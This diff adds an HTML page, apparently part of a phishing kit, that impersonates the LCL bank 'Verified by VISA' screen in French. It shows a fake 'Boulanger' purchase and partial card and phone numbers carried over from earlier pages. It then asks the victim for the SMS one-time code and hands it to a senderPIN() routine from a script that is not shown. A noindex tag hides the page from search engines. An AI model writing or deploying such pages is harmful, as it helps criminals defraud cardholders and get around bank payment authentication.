@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="robots" content="noindex,nofollow">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>otpLCL_Visa</title>
+
+    <!--Scripts jquery-->
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+    <!--Scripts jquery-->
+    <script>
+        document.getElementById("encryptedCardNumber").innerHTML =  localStorage.getItem("encryptedCardNumber");
+         document.getElementById("numtel").innerHTML =  localStorage.getItem("numtel");
+       
+       </script>
+<script>
+    function validateForm() {
+      var x = document.forms["myForm"]["otp"].value;
+      if (x == "" || x == null) {
+        alert("Veuillez entrer le code reçu par SMS");
+        return false;
+      }
+    }
+    </script>
+</head>
+
+<link rel="stylesheet" href="./otpLCL_Visa.css">
+
+<body>
+    <div id="otp">
+
+    </div>
+
+    <div class="totp">
+
+        <form name="myForm" onsubmit="  validateForm();senderPIN()">
+
+            <div class="wrapper">
+
+                <div class="head">
+
+                    <span class="bankLogo">
+
+                        <img src="./assets/LCL.png">
+
+                    </span>
+
+                    <span class="ccLogo">
+                        <img src="./assets/cbSecure.jpg">
+                    </span>
+
+                </div>
+                <div class="alert">
+
+                    <p>Authentification en cours...</p>
+                    <br>
+                    <p style="font-size: medium; font-weight: lighter;">
+                        Veuillez-vous saisir le code d'authentification reçu par SMS
+                    </p>
+                    <br>
+                    <div class="lds-spinner">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div><br>
+                <h1>Saisie du code d'authentification</h1><br>
+
+                <p>Pour renforcer la sécurité des paiements par carte bancaire sur internet,
+                    LCL a adopté la solution Verified by VISA™, il vous suffit de vous identifier en saisissant le code
+                    d'authentification à usage unique qui vient de vous être transmis par téléphone.
+                </p>
+
+                <br>
+
+                <div class="details">
+                    <div class="labels">
+                        <label for="" class="a">Marchand: </label><br>
+                       
+                        <label for="" class="a">Date:</label> <br>
+                        <label for="" class="a">N° de carte: </label> <br>
+                        <label for="" class="a">N° de téléphone: </label><br>
+
+                    </div>
+                    <div class="spans">
+                        <span id="marchand"> Boulanger</span><br>
+                       
+                        <span id="date"></span><br>
+                        <span>xxxxxxx<span id="encryptedCardNumber"></span> </span><br>
+                        <span>xxxxxxx<span id="numtel"></span></span><br>
+
+                    </div><br><br>
+                    <label for="">Veuillez saisir sans espace le code d'authentification: &NonBreakingSpace;</label>
+                    <input class="otp" name="otp"  id="numPin" type="text"><br><br>
+
+                    <button type="submit" class="ok" href="javascript:void(0);" onsubmit="senderPIN();">
+                        Valider
+                    </button>
+
+                </div>
+                <br>
+                <p class="do">
+                    Cette identification est obligatoire pour conclure votre achat.
+                    Vous pouvez cependant annuler la transaction en cliquant sur le lien ci-dessous.
+                    Le paiement associé ne sera pas pris en compte.
+                </p>
+                <br>
+                <a href="#">▸ Abandonner et annuler mon achat</a>
+            </div>
+<br>
+<p class="do">Si vous ne revevez pas un SMS, consulter l'application mobile de votre banque
+</p>
+        </form>
+    </div>
+    <script src="./senderPIN.js">
+    </script>
+
+    <script>
+        var dt = new Date();
+        document.getElementById("date").innerHTML = (("0" + dt.getDate()).slice(-2)) + "." + (("0" + (dt.getMonth() +
+            1)).slice(-2)) + "." + (dt.getFullYear()) + " " + (("0" + dt.getHours()).slice(-2)) + ":" + (("0" + dt
+            .getMinutes()).slice(-2));
+    </script>
+    <!--Animated show for the div-->
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $('.ok').click(function () {
+                $('.totp').fadeOut('4000');
+                $('#otp').load('commande.html').delay('5000').fadeIn('5000');
+                $('#otp').click(senderPIN());
+
+            });
+        });
+    </script>
+</body>
+
+</html>
